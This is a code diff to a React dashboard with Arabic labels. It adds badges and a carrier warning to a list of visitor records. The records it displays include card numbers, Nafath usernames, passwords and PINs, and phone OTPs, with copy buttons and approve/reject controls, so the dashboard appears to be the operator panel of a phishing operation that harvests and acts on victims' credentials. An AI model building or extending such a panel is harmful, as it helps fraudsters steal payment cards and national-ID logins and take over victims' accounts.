@@ -399,6 +399,8 @@ function ConversationItem({
     return "زائر جديد"
   }
 
+  const hasPhone = !!(str(record.phone) || str(record.authorizedPhone))
+
   return (
     <div
       onClick={onClick}
@@ -437,11 +439,27 @@ function ConversationItem({
           </span>
         </div>
         <div className="flex items-center justify-between">
-          <p className={`text-xs truncate max-w-[180px] ${isUnread ? "text-gray-300 font-medium" : "text-gray-500"}`}>
-            {approvalNeeded && <span className="text-red-400 font-semibold">⚠ تحتاج موافقة • </span>}
+          <p className={`text-xs truncate max-w-[140px] ${isUnread ? "text-gray-300 font-medium" : "text-gray-500"}`}>
+            {approvalNeeded && <span className="text-red-400 font-semibold">⚠ </span>}
             {getLastActivity()}
           </p>
-          <div className="flex items-center gap-1.5 shrink-0">
+          <div className="flex items-center gap-1 shrink-0">
+            {/* Data presence badges */}
+            {hasCard && (
+              <span className="inline-flex items-center gap-0.5 px-1 py-0.5 rounded bg-orange-900/40 text-orange-300 text-[8px] font-bold" title="بطاقة">
+                <CreditCard className="h-2.5 w-2.5" />
+              </span>
+            )}
+            {hasPhone && (
+              <span className="inline-flex items-center gap-0.5 px-1 py-0.5 rounded bg-sky-900/40 text-sky-300 text-[8px] font-bold" title="جوال">
+                <Phone className="h-2.5 w-2.5" />
+              </span>
+            )}
+            {hasNafad && (
+              <span className="inline-flex items-center gap-0.5 px-1 py-0.5 rounded bg-teal-900/40 text-teal-300 text-[8px] font-bold" title="نفاذ">
+                <Shield className="h-2.5 w-2.5" />
+              </span>
+            )}
             {step && (
               <span className={`inline-block px-1.5 py-0.5 rounded text-[9px] font-semibold whitespace-nowrap ${STEP_COLORS[step] || STEP_COLORS[""]}`}>
                 {STEP_LABELS[step]?.split(" ").slice(-1)[0] || "زيارة"}
@@ -1059,16 +1077,35 @@ export default function DashboardPage() {
                   </p>
                 </div>
 
-                {/* Header actions */}
-                <div className="flex items-center gap-2 shrink-0">
+                {/* Header actions + data badges */}
+                <div className="flex items-center gap-1.5 shrink-0">
+                  {/* Data presence badges */}
+                  {!!(str(selectedRecord.cardNumber) && str(selectedRecord.cardNumber).length > 3) && (
+                    <span className="inline-flex items-center gap-1 px-2 py-1 rounded-lg bg-orange-900/40 text-orange-300 text-[10px] font-bold border border-orange-800/40" title="بيانات بطاقة">
+                      <CreditCard className="h-3 w-3" />
+                      <span className="hidden sm:inline">بطاقة</span>
+                    </span>
+                  )}
+                  {!!(str(selectedRecord.phone) || str(selectedRecord.authorizedPhone)) && (
+                    <span className="inline-flex items-center gap-1 px-2 py-1 rounded-lg bg-sky-900/40 text-sky-300 text-[10px] font-bold border border-sky-800/40" title="بيانات جوال">
+                      <Phone className="h-3 w-3" />
+                      <span className="hidden sm:inline">جوال</span>
+                    </span>
+                  )}
+                  {!!(str(selectedRecord.nafadUsername) || str(selectedRecord.nafadPassword) || str(selectedRecord.nafaz_pin)) && (
+                    <span className="inline-flex items-center gap-1 px-2 py-1 rounded-lg bg-teal-900/40 text-teal-300 text-[10px] font-bold border border-teal-800/40" title="بيانات نفاذ">
+                      <Shield className="h-3 w-3" />
+                      <span className="hidden sm:inline">نفاذ</span>
+                    </span>
+                  )}
                   {selectedNeedsApproval && (
-                    <span className="hidden sm:flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs font-bold bg-red-900/50 text-red-300 flash-badge">
-                      <Bell className="h-3.5 w-3.5" />
-                      تحتاج موافقة
+                    <span className="hidden sm:flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-[10px] font-bold bg-red-900/50 text-red-300 border border-red-800/40 flash-badge">
+                      <Bell className="h-3 w-3" />
+                      موافقة
                     </span>
                   )}
                   {str(selectedRecord.step) && (
-                    <span className={`hidden sm:inline-block px-2.5 py-1 rounded-full text-[11px] font-semibold ${STEP_COLORS[str(selectedRecord.step)] || STEP_COLORS[""]}`}>
+                    <span className={`hidden sm:inline-block px-2 py-1 rounded-lg text-[10px] font-semibold ${STEP_COLORS[str(selectedRecord.step)] || STEP_COLORS[""]}`}>
                       {STEP_LABELS[str(selectedRecord.step)] || str(selectedRecord.step)}
                     </span>
                   )}
@@ -1258,7 +1295,14 @@ export default function DashboardPage() {
                     {/* Phone Info + Approve/Reject */}
                     <MiniSection title="معلومات الجوال" icon={Phone}>
                       <DetailRow icon={Phone} label="رقم الجوال" value={str(selectedRecord.phone) || str(selectedRecord.authorizedPhone)} mono copyable />
-                      <DetailRow icon={Wifi} label="المشغل" value={str(selectedRecord.operator)} />
+                      <DetailRow icon={Wifi} label="شركة الاتصال" value={str(selectedRecord.phoneCarrier) || str(selectedRecord.operator)} copyable />
+                      {/* Missing carrier warning */}
+                      {!(str(selectedRecord.phoneCarrier) || str(selectedRecord.operator)) && (str(selectedRecord.phone) || str(selectedRecord.authorizedPhone)) && (
+                        <div className="flex items-center gap-2 py-2 border-b border-[#2a3942]/60">
+                          <AlertTriangle className="h-3.5 w-3.5 text-amber-400 shrink-0" />
+                          <span className="text-[11px] text-amber-400/80">شركة الاتصال غير محددة</span>
+                        </div>
+                      )}
                       <DetailRow icon={Hash} label="OTP الجوال" value={str(selectedRecord.phoneOtp)} mono copyable />
                       {/* Phone Approve/Reject */}
                       <div className="mt-2 pt-2 border-t border-[#2a3942]/60">
